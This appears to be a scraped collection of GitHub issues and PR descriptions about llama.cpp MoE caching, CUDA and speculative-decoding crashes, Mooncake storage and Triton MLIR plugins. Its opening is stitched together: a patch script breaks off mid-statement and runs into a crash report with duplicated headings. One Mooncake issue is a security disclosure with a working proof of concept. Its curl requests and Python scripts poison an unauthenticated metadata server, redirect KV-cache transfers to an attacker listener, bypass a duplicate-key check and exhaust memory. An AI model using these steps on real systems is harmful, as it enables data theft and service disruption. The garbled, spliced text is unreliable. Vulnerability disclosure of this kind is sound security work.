simulated hit rate at 69% expert budget). Complementary to #21067: prefetch
hides *cold* transfers at large ubatch (prompt); this removes *hot*
re-transfers at ubatch 1 (decode).

## Measured benefit

4× RTX 3090, EPYC 7R13 48c, 8-ch DDR4-3200 256GB; llama-bench tg300, identical command
lines both arms:

| Model | Regime | cache | vanilla | gain |
|---|---|---|---|---|
| GLM-5.1 754B IQ2_M (220 GB) | zero-config | 17.49 | 13.96 | **+25%** |
| Qwen3.5 397B Q3_K_XL (167 GB) | zero-config | 30.25 | 28.18 | +7% |
| Qwen3.5 122B (fits in VRAM) | zero-config | 74.98 | 74.98 | parity (cache dormant) |
| 13 models / 9 architectures | forced `-ngl 99 -ncmoe 99` | | | +10%…+57%, 16/16 ≥ parity |

Quality: decode-path perplexity statistically identical to pure CPU;
prompt/batch path bit-untouched; `test-backend-ops` MUL_MAT_ID 789/789 both
modes. (GPU rounding can flip a near-tie token under greedy decoding, same
class as any `-ngl` change.)

## Maintenance burden:

**Where the code lives.** ~1,700 lines in one new CUDA file pair
(`moe-cache.cu/.cuh`); a backend-agnostic function-pointer API table
(`ggml-backend-moe-cache.h`); small null-checked hooks in `ggml-cpu.c`/`ops.cpp`
(mul_mat_id + GLU) and `ggml-backend.cpp` (scheduler offer/redirect); a fit
rule + `--moe-cache` flag in common. Non-CUDA builds see a zero-initialized
table and no-op hooks; `--moe-cache 0` restores stock behavior exactly.

**The real costs**

1. **It hooks the CPU mul_mat_id hot path.** The hooks are null-checked
   pointers, but anyone refactoring the CPU MoE kernels or the scheduler
   split logic now has a second consumer to think about. This is the largest
   structural cost.
2. **Heuristics that maintainers didn't choose.** Shape-census stability
   window, baseline-sampled bail-out (EWMA, 4 strikes at +5%), VRAM reserve
   default, decode-only fill. They're measured, but they're policy, and
   policy invites tuning requests.
3. **Hard to test in CI.** The cache only engages on spilling MoE models
   during decode; CI can verify it stays dormant and that the dispatch path
   is numerically correct (a built-in selftest does this model-free), but the
   perf claims need big-RAM multi-GPU hardware. Realistically, regressions
   would be caught by users, not CI.
4. **CUDA-only.** The API table is backend-agnostic, but today only CUDA
   registers it; Metal/Vulkan users will ask.
5. **State.** A persistent hot-set file (`~/.cache/llama.cpp/`) and an
   admission/eviction state machine — more surface than a stateless
   optimization.

**What would reduce the burden, if there's interest:**

- A **minimal core** (plain per-node dispatch only: no fused gate+up+SwiGLU,
  no GPU-resident handoff, no hot-set persistence) is roughly half the code
  and keeps most of the gain; I can measure each layer's exact contribution
  on this hardware.
- Landing the **API table + CPU hooks alone** first (~small, inert without a
  backend registration) would let any backend implement caching out-of-tree
  before committing to the CUDA implementation.
- Or: nobody merges anything, and this stays a documented design +
  benchmark set that informs #21067 or a future maintainer-built version.
  That's a fine outcome too.

## Offer

The 4×3090 / 48-core / 8-channel 256GB DDR4-3200 box is available for any benchmark,
ablation, or A/B against #21067 that would help evaluate this. All results
above are reproducible with the commands in the branch's commit messages.

I have no logs but let my local AI write a fix for me.


<details>
<summary>apply_glm_rpc_fix.sh</summary>
<!-- Copy-pasted short logs go into the "console" area here -->


```console
#!/bin/bash
# Applies the two GLM-5.3-Flash over RPC fixes to a llama.cpp source tree
# (see GLM5-RPC-FIXES.md for details). Idempotent: already-applied fixes are skipped.
#
# Usage: ./apply_glm_rpc_fix.sh [path-to-source-tree]
# Default tree: the directory containing this script.

set -euo pipefail

TREE="${1:-$(cd "$(dirname "$0")" && pwd)}"

python3 - "$TREE" <<'EOF'
import sys

tree = sys.argv[1]

import re

FIXES = [
    {
        "file": "ggml/src/ggml-alloc.c",
        "title": "zero-sized tensors: place at chunk 0 instead of creating size-0 chunks",
        "marker": "zero-sized tensors still need a valid address",
        # (indent) captured so the insertion keeps the surrounding style
        "regex": (
            r"static struct buffer_address ggml_dyn_tallocr_alloc"
            r"\(struct ggml_dyn_tallocr \* alloc, size_t size, const struct ggml_tensor \* tensor\) \{\n"
            r"    size = aligned_offset\(NULL, size, alloc->alignment\);\n"
        ),
        "replacement": (
            "static struct buffer_address ggml_dyn_tallocr_alloc"
            "(struct ggml_dyn_tallocr * alloc, size_t size, const struct ggml_tensor * tensor) {\n"
            "    size = aligned_offset(NULL, size, alloc->alignment);\n"
            "\n"
            "    // zero-sized tensors still need a valid address. place them at offset 0 of the first chunk\n"
            "    // instead of allocating memory, so they do not create size-0 chunks that the realloc logic\n"
            "    // cannot track (such chunks have no valid base on remote buffers)\n"
            "    if (size == 0) {\n"
            "        if (alloc->n_chunks == 0) {\n"
            "            ggml_dyn_tallocr_new_chunk(alloc, alloc->alignment);\n"
            "            alloc->chunks[0]->max_size = alloc->alignment;\n"
            "        }\n"
            "        return (struct buffer_address) { .chunk = 0, .offset = 0 };\n"
            "    }\n"
        ),
    },
    {
        "file": "src/models/glm5-next.cpp",
        "title": "DSA gather path: fold head dim into N to avoid degenerate N=1 batched GEMM",
        "marker": "fold the head dim into N",
        "regex": (
            r"(?P<ind>        )ggml_tensor \* v_t = ggml_cont\(ctx0, ggml_transpose\(ctx0, k_g\)\);\s*"
            r"// \[n_sel, kv_lora_rank, 1, n_tokens\]\n"
            r"        ggml_tensor \* kqv = ggml_mul_mat\(ctx0, v_t, kq\);\s*"
            r"// \[kv_lora_rank, 1, n_head, n_tokens\]\n"
        ),
        "replacement": (
            "        ggml_tensor * v_t = ggml_cont(ctx0, ggml_transpose(ctx0, k_g)); // [n_sel, kv_lora_rank, 1, n_tokens]\n"
            "        // fold the head dim into N so this is not a strided-batched GEMM with N=1, which some\n"
            "        // BLAS backends have no kernel for; kq is contiguous, the token batch stays as-is\n"
            "        ggml_tensor * kqv = ggml_mul_mat(ctx0, v_t, ggml_reshape_4d(ctx0, kq, kq->ne[0], kq->ne[2], 1, kq->ne[3]));\n"
            "        kqv = ggml_reshape_4d(ctx0, kqv, kv_lora_rank, 1, kq->ne[2], kq->ne[3]); // [kv_lora_rank, 1, n_head, n_tokens]\n"
        ),
    },
]

rc = 0
for fix in FIXES:
    path = f"{tree}/{fix['file']}"
    try:
        with open(path, encoding="utf-8") as f:
            src = f.read()
    except FileNotFoundError:
        print(f"SKIP   {fix['file']}: not found (not needed on this tree)")
        continue
    if fix["marker"] in src:
        print(f"OK     {fix['file']}: already applied")
        continue
    m = re.search(fix["regex"], src)
    if m is None:
        print(f"FAIL   {fix['file']}: anchor not found, tree differs from expected")
        rc = 1
        continue
    if len(re.findall(fix["regex"], src)) != 1:
        print(f"FAIL   {fix['file']}: anchor found multiple times, aborting to stay safe")
        rc = 1
        continue
    src = src[:m.start()] + fix["replacement"] + src[m.end():]
    with open(path, "w", encoding="utf-8") as f:
        f.write(src)
    print(f"APPLIED {fix['file']}: {fix['title']}")

sys.exit(rc)
EOF

if [ $? -eq 0 ]; then
    echo "Done."

### Name and Version

- LM Studio 2.33.0 = b10760, 2.42.0 = b11087, 2.45.0 = b11163, 2.46.0 = b11189
llama.cpp CUDA (llama-server)

### Operating systems

Windows

### GGML backends

CUDA

### Hardware

7x Volta sm_70 (1x Quadro GV100 + 6x Tesla V100 32GB), driver 582.78, CUDA 12.4; --split-mode layer (7-way), --main-gpu 0, --parallel 1, --ubatch-size 384, ctx 260096, KV f16

### Models

Qwen3.8-Flash-Next-Uncensored Q8_0 GGUF (176 GB); 48 blocks, 24/2 heads, head_dim 256, sparse indexer top_k 2048, 512 experts (top-10)

### Problem description & steps to reproduce

### Name and Version

Deterministic crash reproduced on four LM Studio llama.cpp CUDA runtimes:

- 2.33.0 = llama.cpp b10760
- 2.42.0 = llama.cpp b11087 (c21284cdf)
- 2.45.0 = llama.cpp b11163 (fc343a84b)
- 2.46.0 = llama.cpp b11189 (a25c9865f)

Engine version per crash is pinned by Windows Error Reporting (faulting module path contains `cuda-avx2-<runtime version>`), so this is not a stale-process artifact.

### Operating systems

Windows 11

### Which llama.cpp modules do you know to be affected?

llama-server / ggml-cuda — the qwen4exp (Qwen3.8-Flash-Next) prefill path under multi-GPU layer split. The failure reproduces with Flash Attention **on and off** and with CUDA graphs **enabled and disabled**, so it is not specific to the FA or non-FA kernel paths.

### Hardware

7x Volta sm_70 (1x Quadro GV100 + 6x Tesla V100 32 GB HBM2), driver 582.78, CUDA 12.4 runtime.
`--split-mode layer` (7-way layer split), `--main-gpu 0`, `--parallel 1`, `--ubatch-size 384`, ctx 260096, KV f16, kv-unified off. (Peer access was never enabled — `GGML_CUDA_P2P` was not set.)

### Models

Qwen3.8-Flash-Next-Uncensored Q8_0 GGUF (176 GB). Architecture metadata from the GGUF header: 48 blocks, 24 attention heads / 2 kv heads, head_dim 256, sparse indexer (top_k 2048), 512 experts (top-10), PLE/MTP heads.

### Problem description & steps to reproduce

Prefilling a long agent session with high partial prefix-cache reuse (f_keep ≈ 0.96–0.99) kills llama-server **deterministically at a fixed token position** — the same prompt always dies at the same `n_tokens`/`progress`, every time, on every runtime, with both Flash Attention modes.

**Session A (~65–72K-token prompt) — dies at ≈1/3 of the prefill, 4/4:**

| # | time (UTC+8) | runtime | FA | graphs | n_tokens at death | progress | signature |
|---|---|---|---|---|---|---|---|
| 1 | 09-25 20:26 | 2.45.0 | off | disabled | 23,780 | 0.33 | `illegal memory access` (at `cudaStreamSynchronize`, ggml-cuda.cu:2547) |
| 2 | 09-25 21:00 | 2.45.0 | off | disabled | 21,732 | 0.33 | same |
| 3 | 09-25 21:17 | 2.45.0 | off | disabled | 23,780 | 0.33 | same |
| 4 | 09-25 21:36 | 2.42.0 | off | disabled | 23,780 | 0.33 | same |

**Session B (~19.6K-token prompt) — dies at ≈39% of the prefill, 9/9 across every runtime, both FA modes, both graph states, and with/without `CUDA_MODULE_LOADING=EAGER`:**

| # | time (UTC+8) | runtime | FA | graphs | EAGER | n_tokens at death | progress | signature |
|---|---|---|---|---|---|---|---|---|
| 5 | 09-25 21:58 | 2.33.0 (b10760) | off | disabled | yes | **7,633** | **0.39** | `invalid argument` @ `ggml_cuda_kernel_launch` (common.cuh:1676) |
| 6 | 09-26 10:18 | 2.33.0 (b10760) | off | **enabled** | yes | **7,633** | **0.39** | identical |
| 7 | 09-26 11:33 | 2.46.0 (b11189) | off | **enabled** | yes | **7,633** | **0.39** | `invalid argument` @ launch (common.cuh:1707) |
| 8 | 09-26 12:20 | 2.46.0 (b11189) | off | **enabled** | yes | **7,633** | **0.39** | identical |
| 9 | 09-26 12:35 | 2.46.0 (b11189) | **on** | **enabled** | yes | **7,633** | **0.39** | identical |
| 10 | 09-26 13:06 | 2.45.0 (b11163) | **on** | **enabled** | yes | **7,633** | **0.39** | `invalid argument` @ launch (common.cuh:1716) |
| 11 | 09-26 13:15 | 2.42.0 (b11087) | **on** | **enabled** | yes | **7,633** | **0.39** | `invalid argument` @ launch (common.cuh:1716) |
| 12 | 09-26 13:41 | 2.33.0 (b10760) | **on** | **enabled** | **no** | **7,633** | **0.39** | identical |
| 13 | 09-26 13:47 | 2.46.0 (b11189) | **on** | **enabled** | **no** | **7,633** | **0.39** | identical |

All crashes are followed by fail-fast 0xc0000409 (ucrtbase.dll).

### What this rules out

- **Engine version**: all of 2.33.0 / 2.42.0 / 2.45.0 / 2.46.0 crash; per-prompt death position is identical across versions (WER-pinned).
- **Flash Attention mode**: session B dies at the identical position and signature with FA **off** (4×) and FA **on** (3×). This is not a FA-path or non-FA-path bug.
- **CUDA graphs**: crashes reproduce with graphs disabled (env var set) and enabled — no effect either way.
- **`GGML_CUDA_NO_PEER_COPY=1`**: no effect (present for some crashes, removed for others). I later checked the source: at b10760/b11189 this name exists only as a compile-time `#ifdef`, there is no runtime `getenv` for it. The real opt-in for peer access is `GGML_CUDA_P2P`, which was never set, so peer access was likely never enabled in any of these runs.
- **`CUDA_MODULE_LOADING=EAGER`**: present for crashes #5-#10, absent for #11-#13 (tested on both 2.33.0 and 2.46.0) — no effect (identical death position and signature).
- **GPU count/mix**: crashes reproduce on the full 7-GPU mix (6x Tesla V100 + 1x Quadro GV100) and on 6x Tesla PG503-216 only (Quadro removed, uniform Tesla topology) — 2/2 at the identical position (2.46.0, FA on). Not specific to the GPU composition or the 7-way split.
- **Prompt delivery channel**: all repro attempts used the same client (LM Studio chat window session resume); server logs confirm identical request structure each time.
- **#29393 (RMS_NORM + SCALE fusion)**: 2.46.0 includes this norm-kernel rewrite, yet dies at the identical position and signature as 2.33.0 (which predates the refactor by 429 commits).

Additional fingerprint: every FA-off load logs this once at init —

```
E ggml_gallocr_reserve_n_impl: failed to allocate CUDA0 buffer of size 4884066560
```

4,884,066,560 B ≈ 24 heads × 384 (ubatch)

items.author: SeverinVisionary
items.body_excerpt:
### Name and Version

Commit: `7fe450e19305b828c199d602c23a8337aaa1f03b`.

```console
version: 0.5.0-dev (build 11146, commit 7fe450e19)
built with AppleClang 21.0.0.21000101 for Darwin arm64
```

CPU build:

```sh
cmake -B build -DGGML_METAL=OFF -DGGML_BLAS=OFF -DLLAMA_CURL=OFF -DLLAMA_OPENSSL=OFF -DCMAKE_BUILD_TYPE=Release
cmake --build build --target llama-speculative
```

### Operating systems

Mac, Linux

macOS 27.0; the existing Linux reproduction used Ubuntu 24.04 and gcc 13.3.

### GGML backends

CPU

### Hardware

Apple M1 Pro; Intel Xeon at 2.10 GHz for the existing Linux abort records.

### Models

Tiny random Llama target and a noised copy as draft: F32, 2 layers, vocabulary size 8. Each GGUF is 24,064 bytes. The vocabulary is `a` through `h`, with EOS at `h` (id 7). The prompt `bcdbc` is ids `1,2,3,1,2`.

Both models are in the self-contained archive below.

### Problem description & steps to reproduce

Tree mode in `llama-speculative` aborts for some seeds with `GGML_ASSERT(logits != nullptr)`. The error says the requested batch row has `batch.logits[N] != true`.

Decode the archive below in the llama.cpp checkout. On the Mac build, this command reproduces the abort:

```sh
build/bin/llama-speculative -m target.gguf -md draft.gguf -p bcdbc -n 4 --spec-draft-n-max 3 \
  -c 64 -t 1 --cache-type-k f32 --cache-type-v f32 -fa off \
  --samplers 'penalties;top_k;top_p;min_p;temperature' --temp 1.0 --top-k 0 --top-p 1.0 \
  --min-p 0.0 --repeat-penalty 1.0 --repeat-last-n 64 -np 3 --spec-draft-p-split 0.1 -s 2102715109
```

For that seed, `-np 3` aborted in 5/5 repeats. Changing only `-np` to 1 or 2 completed successfully. Changing only `-c` to 512 still aborted.

The Linux build needs different seeds:

- `705307544`: aborts at `-np 3`, completes at `-np 2`.
- `1931638903`: aborts at both `-np 2` and `-np 3`.

Those two Linux seeds completed on the Mac at all three `-np` settings. The seed should therefore be treated as platform/build-specific.

The saved Linux check over 100 seeds found 0 aborts at `-np 1`, 9 at `-np 2`, and 11 at `-np 3`. Each first aborting seed also aborted in all five repeats. The fresh Mac check above is a reproduction, not an abort-rate estimate.

The failing logits access is reproducible; the branch bookkeeping that leads to it has not been traced. Runtime verification is on the pinned build above, not current master.

#13963 has the same error text, but concerns `llama-server` with Gemma draft models and KV-slot failures. This is the standalone example on a tiny CPU fixture.

### First Bad Commit

Not bisected.

### Relevant log output

```console
common/sampling.cpp:154: GGML_ASSERT(logits != nullptr) failed
get_logits_ith: invalid logits id 3, reason: batch.logits[3] != true
```

The Mac process exited with SIGABRT (Python return code `-6`). The saved Linux `-np 2` failure reports invalid logits id `2` instead of `3`.

AI assistance: Codex prepared this report from the existing reproduction kit and reran the Mac checks.

items.author: dcosmos
items.body_excerpt:
### Describe your usage question

使用mooncake当作sglang hicache的L3，我给mooncake master开启了root_fs_dir，root_fs_dir是挂载的一个DFS。
`mooncake_master \
  --enable_http_metadata_server=true \
  --http_metadata_server_host=0.0.0.0 \
  --http_metadata_server_port=8080 \
  --global_file_segment_size=1073741824 \
  --eviction_high_watermark_ratio=0.95 \
  --root_fs_dir=/root/dfs_dir/`
我的mooncake部署是一个master，4个store，每个store机器上都挂载了该目录。现象是，能够正常地启动sglang，并正常运行bench，过程中dfs目录中也会持续写入文件。但我的问题是：sglang::scheduler进程的内存占用会飙升，直到吃满整个机器。我这里有两个需求：
1. 我怀疑是sglang内置了mooncake的client在吃内存，但不知道是什么确切的原因，还请解惑
2. 这种情况能否抑制或改善，我尝试了指定--global_file_segment_size参数没有看到预期的效果。
谢谢！

items.title: [Bug]: Unauthenticated Mooncake HTTP metadata server allows segment descriptor poisoning and KV transfer redirection
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The HTTP metadata server shipped in the mooncake wheel serves GET/PUT/DELETE on `/metadata` without any authentication. A network peer can read every engine's segment descriptor (absolute buffer addresses and data ports), overwrite a victim engine's descriptor to redirect live KV transfers to an attacker-controlled listener while the sender reports success, rewrite `rpc_meta` entries by bypassing the duplicate-key check with DELETE, delete cluster metadata to break new transfers, and grow the server's memory without bound. Runtime-confirmed with the `mooncake.http_metadata_server` component of mooncake-transfer-engine 0.3.11.post1; the same unauthenticated handler still ships in the 0.3.13 wheel and on the main branch as `mooncake-transfer-engine/example/http-metadata-server-python/bootstrap_server.py`. No fix available. Suggested severity: High, CVSS 8.8.

### Details

`mooncake/http_metadata_server.py` (started via `python -m mooncake.http_metadata_server`, default bind 0.0.0.0:8080) is the documented HTTP backend for `TransferEngine` metadata, used as the etcd alternative via a conn string like `http://host:28080/metadata` (`HTTPStoragePlugin` in src/transfer_metadata_plugin.cpp).

The handlers are plain key/value operations with no authentication and no authorization:

- `GET /metadata?key=mooncake/ram/<name>` returns the engine's segment descriptor, including `buffers[].addr` (absolute process addresses), `tcp_data_port`, and RDMA rkeys.
- `PUT` overwrites any segment descriptor. The only integrity check in the file is a duplicate-key rejection for `rpc_meta` keys - and `DELETE` removes the key first, so `DELETE` + `PUT` rewrites `mooncake/rpc_meta/<name>` (the handshake RPC location) without restriction.
- `DELETE` removes any key. Request bodies are read fully into memory and the store dict has no size or key-count limit (aiohttp's default `client_max_size` of 1 MB rejects one huge body, many smaller keys bypass it).

The data plane trusts these values. `TcpTransport::startTransfer` connects to the IP from `rpc_meta` plus `tcp_data_port` from the segment descriptor, with no validation that the descriptor is authentic. After `tcp_data_port` is poisoned, a normal `transfer_sync_write` sends the payload to the attacker's listener. The sender still reports success: the client session completes once the payload is written to the socket and the server side acknowledges nothing.

### PoC

Environment: Linux x86_64, Python 3.11, `pip install mooncake-transfer-engine==0.3.11.post1` on two shells of one host (use the host IP 192.168.105.123 below). Terminal 1 starts the server:

```bash
MC_FORCE_TCP=1 python -m mooncake.http_metadata_server --port 28080
```

Terminal 2 runs the receiving victim:

```python
# victim_a.py
import ctypes, time
from mooncake.engine import TransferEngine

buf = ctypes.create_string_buffer(65536)
te = TransferEngine()
te.initialize("va", "http://192.168.105.123:28080/metadata", "tcp", "")
te.register_memory(ctypes.addressof(buf), 65536)
print("va_addr =", ctypes.addressof(buf), flush=True)
time.sleep(7200)
```

Terminal 3 is the attacker listener:

```python
# listener.py
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.105.123", 39999))
s.listen(1)
c, _ = s.accept()
data = b""
while True:
    chunk = c.recv(65536)
    if not chunk:
        break
    data += chunk
print(len(data), data[:96])   # 88 bytes: 24-byte header (includes target absolute address) + payload
```

Sender, run as a fresh process each round (the segment descriptor is cached per process):

```python
# sender.py
import ctypes
from mooncake.engine import TransferEngine

payload = ctypes.create_string_buffer(b"SECRET_KV_" + b"S" * 54, 64)
te = TransferEngine()
te.initialize("vb", "http://192.168.105.123:28080/metadata", "tcp", "")
ret = te.transfer_sync_write("va", ctypes.addressof(payload), VA_ADDR, 64)  # VA_ADDR printed by victim_a
print("transfer returned", ret)
```

Control round: run `sender.py` once; it prints `transfer returned 0` and victim A's buffer now starts with `SECRET_KV_`.

Attack round:

```bash
# 1. read the victim's descriptor, no credentials
curl "http://192.168.105.123:28080/metadata?key=mooncake/ram/va"
# 2. save that JSON, change only "tcp_data_port" to 39999, put it back
curl -X PUT --data-binary @va_poisoned.json "http://192.168.105.123:28080/metadata?key=mooncake/ram/va"
# 3. run sender.py again as a fresh process
```

Observed: the sender prints `transfer returned 0`, the listener prints 88 bytes consisting of the 24-byte protocol header (including the target absolute address) followed by the 64-byte `SECRET_KV_...` payload, and victim A's buffer is unchanged - the payload was exfiltrated with neither endpoint reporting an error.

rpc_meta duplicate-check bypass:

```bash
curl -X PUT --data '{"ip_or_host_name":"8.8.8.8","rpc_port":9}' "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"   # 400 Duplicate rpc_meta key not allowed
curl -X DELETE "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"                                                 # 200
curl -X PUT --data '{"ip_or_host_name":"8.8.8.8","rpc_port":9}' "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva" # 200
curl "http://192.168.105.123:28080/metadata?key=mooncake%2Frpc_meta%2Fva"                                                           # {"ip_or_host_name":"8.8.8.8","rpc_port":9}
```

Resource exhaustion: `PUT` a 900 KB body to 2800 distinct keys; the server process RSS grew from 39 MB to about 2.5 GB.

### Impact

This is a missing-authorization issue (CWE-306) on the cluster metadata control plane. The attacker needs no credentials, only reachability of the metadata server port, which is a fixed, operator-chosen port bound on all interfaces by default.

Confidentiality: KV cache data (user prompts and context) is exfiltrated to an attacker-controlled listener while both end

items.title: [RFC][Store]: Settle segment.name cardinality and consolidate derived-index ownership in segment lifecycle
items.author: LinyuWang
items.body_excerpt:
# [RFC][Store]: Settle `segment.name` cardinality and consolidate derived-index ownership in segment lifecycle

## Summary

The segment lifecycle code in `mooncake-store/src/segment.cpp` maintains several derived indexes over `mounted_segments_` (`client_segments_`, `client_by_name_`, `segment_id_by_name_`, `segments_by_host_`, plus `AllocatorManager`). These indexes currently encode **two contradictory assumptions** about the cardinality of `segment.name`:

- **name is a unique key** → `client_by_name_` and `segment_id_by_name_` are `name → single value` maps (`include/segment.h:481-483`)
- **name is a grouping key** → `AllocatorManager` (name → list of allocators) and `segments_by_host_` (name → `set<UUID>`, `include/segment.h:23`) are 1:N

The write path never enforces either assumption, and the delete paths compensate locally with conditional logic. This RFC proposes to settle the cardinality question and give the derived indexes a single point of ownership.

## Problem

### 1. Duplicate names are accepted, but not consistently supported

On the client side, every `MountSegmentAndGetId()` call generates a fresh random `segment.id`, while `segment.name = local_hostname_` is constant per client (`client_service.cpp:3529-3530`). A client mounting N non-overlapping buffers therefore produces N segments with the same name and different ids. Master-side dedup checks only `segment.id` (`segment.cpp:228`), so all of them mount successfully.

Consequences:

- `client_by_name_[name] = client_id` and `segment_id_by_name_[name] = segment.id` are silently overwritten (last-wins) (`segment.cpp:277-278`).
- `IsSegmentAllocatable(name)` / `GetSegmentStatusByName(name)` answer for the *latest mounted* id only (`segment.cpp:1090-1115`).
- Consumers of a name disagree about what the name denotes.

### 2. Order-dependent erase semantics in `CommitUnmountSegment`

```cpp
if (segment_id_by_name_it->second == segment_id) {
    segment_manager_->segment_id_by_name_.erase(segment_id_by_name_it);
    segment_manager_->client_by_name_.erase(segment_name);
}
```

(`segment.cpp:503-510`)

The `== segment_id` guard protects the remount-vs-late-unmount race: `Prepare` and `Commit` run under separate lock scopes, so a same-name remount (new id) can interleave between them, and the guard keeps the stale Commit from stealing the new registration's entries. However:

- **It conflates two questions**: "does the name still point at the segment being removed?" (id-level) with "should we forget this name's owner?" (name-level). With more than one segment per name, unmounting the *latest-mounted* segment first erases `client_by_name_[name]` **while other same-name segments are still alive and allocatable**: `ExistsSegmentName` returns false, `GetOwnerClientId` returns nullopt (SSD free-ratio ranking silently degrades to the default), and `IsSegmentAllocatable` returns false for a healthy segment. Unmounting in the opposite order happens to stay correct — i.e. the name-level view depends on unmount order.
- **There is no survivor fallback**: when the guarded entry is erased, the id of a surviving same-name segment is not restored to `segment_id_by_name_`.
- **The fix is asymmetric across paths**: the memory path has this guard; the NoF path does not — the same race there is reported in #4211.

### 3. Redundant, idempotency-based index maintenance

`RemoveHostSegment` is called from `PrepareUnmountSegment`, `PrepareGracefulUnmountSegment`, `CommitUnmountSegment`, and the NoF unmount path; `AddHostSegment` from four mount/remount/restore paths. Every new lifecycle path must remember to keep five derived structures mutually consistent, and the safety net is idempotent re-execution rather than single ownership. This is the class of debt that produced both #4211 and the asymmetry above.

## Proposed directions (pick one)

**A. Admit 1:N.** Change `client_by_name_` / `segment_id_by_name_` to `name → set<UUID>`; Commit erases the id and cascades `client_by_name_` only when the set becomes empty; consumers adopt any-OK semantics. This matches what `AllocatorManager` and `segments_by_host_` already do, and supports multi-NUMA / mixed-media mounts by one client.

**B. Enforce uniqueness.** Reject a second same-name mount (return `SEGMENT_ALREADY_EXISTS`, or require explicitly distinct names such as `ip:port#tag`); erase paths become unconditional; document `segment.name` as a unique key.

Either direction removes the conditional erase, the circular id→name→id lookup, and the unmount-order dependence.

## Relation to existing work

- **#4211** — the same late-unmount race on the NoF path; an instance of the problem this RFC addresses structurally.
- **#3360** (SegmentPool refactor) — its `MountedRegionCatalog` plans "client, name, host, and status indexes"; the name-cardinality decision is a prerequisite design input for that catalog, and the catalog is the natural home for single-ownership index maintenance.
- **#3560** (distinguish NEW/REMOUNT/STALE registration intent) — complementary; explicit per-segment lifecycle intent interacts with what name uniqueness must mean during remount.

## Discussion questions

1. Is "one client mounts multiple same-name segments" an intended, supported case (multi-NUMA, DRAM+SSD tiering), or an artifact of the client API?
2. If intended → direction A; if not → direction B. Which behavior do existing deployments rely on?
3. Should this be folded into #3360 as an explicit design requirement for `MountedRegionCatalog`, or tracked independently?

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues and read the [documentation](https://kvcache-ai.github.io/Mooncake/)

items.title: Use atomic_cas inside a loop
items.author: giorgio-arena
items.body_excerpt:
Hi, I'm experimenting with a simple kernel that reduces a rank-3 tensor on its last dimension. The kernel uses atomics to sum across one tensor row (I know it's not efficient, this is just a simple reproducer). I'm using two versions of the atomics, the first using atomic_add, and the second using the lock-like mechanism with atomic_cas and atomic_xchg.

```
@triton.jit
def _sum_kernel(X, Locks, O, width: tl.constexpr, use_atomic_add: tl.constexpr):
  in_off = tl.program_id(0) * width
  out_off = tl.program_id(0)

  for w in range(0, width):
    x = tl.load(X + in_off + w)
    if use_atomic_add:
      tl.atomic_add(O + out_off, x)
    else:
      while tl.atomic_cas(Locks + out_off, 0, 1) == 1:
        pass
      tl.store(O + out_off, tl.load(O + out_off) + x)
      tl.atomic_xchg(Locks + out_off, 0)


def _sum_fn(a, use_atomic_add):
  b, h, w = a.shape
  locks = torch.zeros([b, h], dtype=torch.int32, device='cuda')
  out = torch.zeros([b, h], dtype=a.dtype, device='cuda')
  _sum_kernel[(b * h,)](a, locks, out, width=w, use_atomic_add=use_atomic_add)
  return out

if __name__ == "__main__":
  x = torch.empty((8, 64, 128), dtype=torch.float32, device="cuda").normal_()
  ref = torch.sum(x, axis=-1)
  rtol = 1e-03

  print(torch.allclose(ref, _sum_fn(x, True), rtol=rtol))
  print(torch.allclose(ref, _sum_fn(x, False), rtol=rtol))
```

Unfortunately for the second version I get
```

  File "/usr/local/home/giorgio/triton/python/triton/compiler.py", line 741, in visit_For
    assert for_op_region.size() == 1, "We use SCF, so the loop body should only have one block"
AssertionError: We use SCF, so the loop body should only have one block
```

Any help would be appreciated, thanks.

items.title: [Discussion] Use Isolated MLIR Symbol Namespace and TypeIDs for Out-of-Tree Backends
items.author: hongziqi
items.body_excerpt:
## Summary

An out-of-tree plugin that shares the host `MLIRContext` hits one of two link failures. Both come from one MLIR rule: **within a single process, each MLIR C++ type may have only one `TypeIDResolver<T>::id`**.

- **Undefined symbol.** The plugin references a TypeID that `libtriton.so` never defined. `dlopen` fails.
- **Conflicting definition.** The plugin defines a TypeID the host already defined, or a second LLVM/MLIR is loaded beside `libtriton.so`. MLIR then treats one class as two identities.

`PluginInfo` / `TRITON_PLUGIN_API_VERSION` fixes neither case. That version only describes the callback table (`AddPassCallback`, `RegisterDialectCallback`, `AddOpCallback`). It cannot create a TypeID, and it cannot merge two of them.

What `TRITON_EXT_ENABLED=1` does today is re-export the MLIR symbols already linked into `libtriton.so`. On nightly `3.8.0+gitf893845b` that set includes Builtin, Func, Arith, SCF, MemRef, Affine, and LLVM. It does not include `linalg::LinalgDialect` or `tensor::TensorDialect`. A plugin that references those two TypeIDs fails `dlopen` with `undefined symbol`.

This proposal: **an out-of-tree backend compiles its own MLIR in a separate symbol namespace, fully isolated from the host TypeIDs. Dialects the host does not provide are defined by the backend. The host and the backend pass modules as MLIR text and do not share an `MLIRContext`.**

## Problem

`TRITON_EXT_ENABLED=1` only controls symbol visibility. **It does not change the libraries linked into `libtriton.so`.** Visibility and the link line are separate:

- Off: `-fvisibility=hidden` plus a version script. The only exported symbol is `PyInit_libtriton`.
- On: the visibility hide and the version script are removed, so every symbol already linked into `libtriton.so` is exported.
- `TRITON_LIBRARIES` in `CMakeLists.txt` does not change with the option. It contains NVVM, LLVM, GPU, SCF, Math-to-LLVM, and Triton's own libraries. It does not contain `MLIRLinalgDialect` or `MLIRTensorDialect`.

An MLIR TypeID must be unique in the process. A plugin that shares the host `MLIRContext` has only two layouts, and each one fails:

| Layout | What the plugin binary does | Failure |
|---|---|---|
| The host owns TypeID `T` | The symbol is undefined (`U`) in the plugin. `dlopen` binds it to the single global instance in `libtriton.so` | The host binary never linked a definition of `T`. Loading the plugin reports `undefined symbol` (for example the LinalgDialect TypeID) |
| The plugin owns TypeID `T` | The plugin uses `MLIR_DEFINE_EXPLICIT_TYPE_ID`, defines the dialect itself, and registers it | Two TypeIDs exist for one type. MLIR asserts at runtime |

The first failure cannot be fixed inside the plugin alone. If the plugin statically links the missing MLIR dialect archives to fill in the IR dependency, it falls into the second failure.

## Proposal

An out-of-tree backend needs Linalg, Tensor, and whatever dialects come after them. Those dialects are not linked into `libtriton.so` today. The 2026-07-08 meetup listed the following responses to the symbol problem:

| Approach | Conclusion |
|---|---|
